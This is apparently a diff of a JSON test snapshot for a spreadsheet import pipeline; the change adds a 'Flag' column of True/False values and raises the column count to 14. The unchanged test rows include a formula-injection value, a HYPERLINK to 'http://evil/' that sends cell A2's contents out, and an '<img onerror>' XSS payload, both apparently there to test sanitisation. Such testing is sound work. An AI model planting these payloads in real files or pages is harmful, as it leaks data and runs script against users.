@@ -48,6 +48,7 @@
      "s:'DateText'",
      "s:'EuroNum'",
      "s:'Pct'",
+     "s:'Flag'",
      "s:'Name'",
      "s:'Email'",
      "s:'Notes'"
@@ -63,6 +64,7 @@
      "s:'01/02/2024'",
      "s:'2,5'",
      "s:'50%'",
+     "s:'True'",
      "s:'NAM_00001'",
      "s:'alice0@example.com'",
      "f:'=HYPERLINK(\"http://evil/?\"&A2,\"x\")'"
@@ -78,6 +80,7 @@
      "s:'2024-03-05'",
      "s:'1.234,56'",
      "s:'0.5'",
+     "s:'False'",
      "s:'NAM_00002'",
      "inlineStr:None",
      "s:'x|||y'"
@@ -93,6 +96,7 @@
      "s:'13/02/2024'",
      "s:'10'",
      "s:'12.5%'",
+     "s:'True'",
      "s:'NAM_00003'",
      "s:'carol2@example.com'",
      "s:'<img src=x onerror=alert(1)>'"
@@ -108,6 +112,7 @@
      "s:'01/02/2024'",
      "s:'2,5'",
      "s:'50%'",
+     "s:'False'",
      "s:'NAM_00004'",
      "s:'dave3@example.com'",
      "s:'café'"
@@ -123,6 +128,7 @@
      "s:'2024-03-05'",
      "s:'1.234,56'",
      "s:'0.5'",
+     "s:'True'",
      "s:'NAM_00001'",
      "s:'alice4@example.com'",
      "f:'=HYPERLINK(\"http://evil/?\"&A2,\"x\")'"
@@ -138,6 +144,7 @@
      "s:'13/02/2024'",
      "s:'10'",
      "s:'12.5%'",
+     "s:'False'",
      "s:'NAM_00002'",
      "s:'bob5@example.com'",
      "s:'x|||y'"
@@ -153,6 +160,7 @@
      "s:'01/02/2024'",
      "s:'2,5'",
      "s:'50%'",
+     "s:'True'",
      "s:'NAM_00003'",
      "s:'carol6@example.com'",
      "s:'<img src=x onerror=alert(1)>'"
@@ -168,6 +176,7 @@
      "s:'01/02/2024'",
      "s:'2,5'",
      "s:'50%'",
+     "s:'True'",
      "s:'NAM_00003'",
      "s:'carol6@example.com'",
      "s:'<img src=x onerror=alert(1)>'"
@@ -183,6 +192,7 @@
      "s:'13/02/2024'",
      "s:'10'",
      "s:'12.5%'",
+     "s:'True'",
      "s:'NAM_00001'",
      "s:'alice8@example.com'",
      "f:'=HYPERLINK(\"http://evil/?\"&A2,\"x\")'"
@@ -198,6 +208,7 @@
      "s:'01/02/2024'",
      "s:'2,5'",
      "s:'50%'",
+     "s:'False'",
      "s:'NAM_00002'",
      "s:'bob9@example.com'",
      "s:'x|||y'"
@@ -213,6 +224,7 @@
      "s:'2024-03-05'",
      "s:'1.234,56'",
      "s:'0.5'",
+     "s:'True'",
      "s:'NAM_00003'",
      "s:'carol10@example.com'",
      "s:'<img src=x onerror=alert(1)>'"
@@ -228,6 +240,7 @@
      "s:'13/02/2024'",
      "s:'10'",
      "s:'12.5%'",
+     "s:'False'",
      "s:'NAM_00004'",
      "s:'dave11@example.com'",
      "s:'café'"
@@ -243,6 +256,7 @@
      "s:'01/02/2024'",
      "s:'2,5'",
      "s:'50%'",
+     "s:'True'",
      "s:'NAM_00001'",
      "s:'alice12@example.com'",
      "f:'=HYPERLINK(\"http://evil/?\"&A2,\"x\")'"
@@ -258,6 +272,7 @@
      "s:'2024-03-05'",
      "s:'1.234,56'",
      "s:'0.5'",
+     "s:'False'",
      "s:'NAM_00002'",
      "s:'bob13@example.com'",
      "s:'x|||y'"
@@ -273,6 +288,7 @@
      "s:'13/02/2024'",
      "s:'10'",
      "s:'12.5%'",
+     "s:'True'",
      "s:'NAM_00003'",
      "s:'carol14@example.com'",
      "s:'<img src=x onerror=alert(1)>'"
@@ -288,6 +304,7 @@
      "s:'01/02/2024'",
      "s:'2,5'",
      "s:'50%'",
+     "s:'False'",
      "s:'NAM_00004'",
      "s:'dave15@example.com'",
      "s:'café'"
@@ -303,6 +320,7 @@
      "s:'2024-03-05'",
      "s:'1.234,56'",
      "s:'0.5'",
+     "s:'True'",
      "s:'NAM_00001'",
      "s:'alice16@example.com'",
      "f:'=HYPERLINK(\"http://evil/?\"&A2,\"x\")'"
@@ -318,6 +336,7 @@
      "s:'13/02/2024'",
      "s:'10'",
      "s:'12.5%'",
+     "s:'False'",
      "s:'NAM_00002'",
      "s:'bob17@example.com'",
      "s:'x|||y'"
@@ -333,6 +352,7 @@
      "s:'01/02/2024'",
      "s:'2,5'",
      "s:'50%'",
+     "s:'True'",
      "s:'NAM_00003'",
      "s:'carol18@example.com'",
      "s:'<img src=x onerror=alert(1)>'"
@@ -348,6 +368,7 @@
      "s:'2024-03-05'",
      "s:'1.234,56'",
      "s:'0.5'",
+     "s:'False'",
      "s:'NAM_00004'",
      "s:'dave19@example.com'",
      "s:'café'"
@@ -363,6 +384,7 @@
      "s:'13/02/2024'",
      "s:'10'",
      "s:'12.5%'",
+     "s:'True'",
      "s:'NAM_00001'",
      "s:'alice20@example.com'",
      "f:'=HYPERLINK(\"http://evil/?\"&A2,\"x\")'"
@@ -378,6 +400,7 @@
      "s:'01/02/2024'",
      "s:'2,5'",
      "s:'50%'",
+     "s:'False'",
      "s:'NAM_00002'",
      "s:'bob21@example.com'",
      "s:'x|||y'"
@@ -393,6 +416,7 @@
      "s:'2024-03-05'",
      "s:'1.234,56'",
      "s:'0.5'",
+     "s:'True'",
      "s:'NAM_00003'",
      "s:'carol22@example.com'",
      "s:'<img src=x onerror=alert(1)>'"
@@ -408,6 +432,7 @@
      "s:'13/02/2024'",
      "s:'10'",
      "s:'12.5%'",
+     "s:'False'",
      "s:'NAM_00004'",
      "s:'dave23@example.com'",
      "s:'café'"
@@ -423,6 +448,7 @@
      "s:'01/02/2024'",
      "s:'2,5'",
      "s:'50%'",
+     "s:'True'",
      "s:'NAM_00001'",
      "s:'alice24@example.com'",
      "f:'=HYPERLINK(\"http://evil/?\"&A2,\"x\")'"
@@ -438,6 +464,7 @@
      "s:'2024-03-05'",
      "s:'1.234,56'",
      "s:'0.5'",
+     "s:'False'",
      "s:'NAM_00002'",
      "s:'bob25@example.com'",
      "s:'x|||y'"
@@ -453,6 +480,7 @@
      "s:'13/02/2024'",
      "s:'10'",
      "s:'12.5%'",
+     "s:'True'",
      "s:'NAM_00003'",
      "s:'carol26@example.com'",
      "s:'<img src=x onerror=alert(1)>'"
@@ -468,6 +496,7 @@
      "s:'01/02/2024'",
      "s:'2,5'",
      "s:'50%'",
+     "s:'False'",
      "s:'NAM_00004'",
      "s:'dave27@example.com'",
      "s:'café'"
@@ -483,6 +512,7 @@
      "s:'2024-03-05'",
      "s:'1.234,56'",
      "s:'0.5'",
+     "s:'True'",
      "s:'NAM_00001'",
      "s:'alice28@example.com'",
      "f:'=HYPERLINK(\"http://evil/?\"&A2,\"x\")'"
@@ -498,6 +528,7 @@
      "s:'13/02/2024'",
      "s:'10'",
      "s:'12.5%'",
+     "s:'False'",
      "s:'NAM_00002'",
      "s:'bob29@example.com'",
      "s:'x|||y'"
@@ -513,6 +544,7 @@
      "s:'01/02/2024'",
      "s:'2,5'",
      "s:'50%'",
+     "s:'True'",
      "s:'NAM_00003'",
      "s:'carol30@example.com'",
      "s:'<img src=x onerror=alert(1)>'"
@@ -528,6 +560,7 @@
      "s:'2024-03-05'",
      "s:'1.234,56'",
      "s:'0.5'",
+     "s:'False'",
      "s:'NAM_00004'",
      "s:'dave31@example.com'",
      "s:'café'"
@@ -543,6 +576,7 @@
      "s:'13/02/2024'",
      "s:'10'",
      "s:'12.5%'",
+     "s:'True'",
      "s:'NAM_00001'",
      "s:'alice32@example.com'",
      "f:'=HYPERLINK(\"http://evil/?\"&A2,\"x\")'"
@@ -558,6 +592,7 @@
      "s:'01/02/2024'",
      "s:'2,5'",
      "s:'50%'",
+     "s:'False'",
      "s:'NAM_00002'",
      "s:'bob33@example.com'",
      "s:'x|||y'"
@@ -573,6 +608,7 @@
      "s:'2024-03-05'",
      "s:'1.234,56'",
      "s:'0.5'",
+     "s:'True'",
      "s:'NAM_00003'",
      "s:'carol34@example.com'",
      "s:'<img src=x onerror=alert(1)>'"
@@ -588,6 +624,7 @@
      "s:'13/02/2024'",
      "s:'10'",
      "s:'12.5%'",
+     "s:'False'",
      "s:'NAM_00004'",
      "s:'dave35@example.com'",
      "s:'café'"
@@ -603,6 +640,7 @@
      "s:'01/02/2024'",
      "s:'2,5'",
      "s:'50%'",
+     "s:'True'",
      "s:'NAM_00001'",
      "s:'alice36@example.com'",
      "f:'=HYPERLINK(\"http://evil/?\"&A2,\"x\")'"
@@ -618,6 +656,7 @@
      "s:'2024-03-05'",
      "s:'1.234,56'",
      "s:'0.5'",
+     "s:'False'",
      "s:'NAM_00002'",
      "s:'bob37@example.com'",
      "s:'x|||y'"
@@ -633,6 +672,7 @@
      "s:'13/02/2024'",
      "s:'10'",
      "s:'12.5%'",
+     "s:'True'",
      "s:'NAM_00003'",
      "s:'carol38@example.com'",
      "s:'<img src=x onerror=alert(1)>'"
@@ -648,6 +688,7 @@
      "s:'01/02/2024'",
      "s:'2,5'",
      "s:'50%'",
+     "s:'False'",
      "s:'NAM_00004'",
      "s:'dave39@example.com'",
      "s:'café'"
@@ -692,7 +733,7 @@
    }
   ],
   "success": true,
-  "total_columns": 13
+  "total_columns": 14
  },
  "gaps_status": 200,
  "keys_final": {
@@ -742,11 +783,12 @@
    "DateText",
    "EuroNum",
    "Pct",
+   "Flag",
    "Name",
    "Email",
    "Notes"
   ],
-  "columns": 13,
+  "columns": 14,
   "rows": 40,
   "success": true
  },
@@ -759,7 +801,7 @@
    "5": false
   },
   "state": {
-   "col_count": 13,
+   "col_count": 14,
    "current_stage": 2,
    "row_count": 40,
    "stages_completed": [
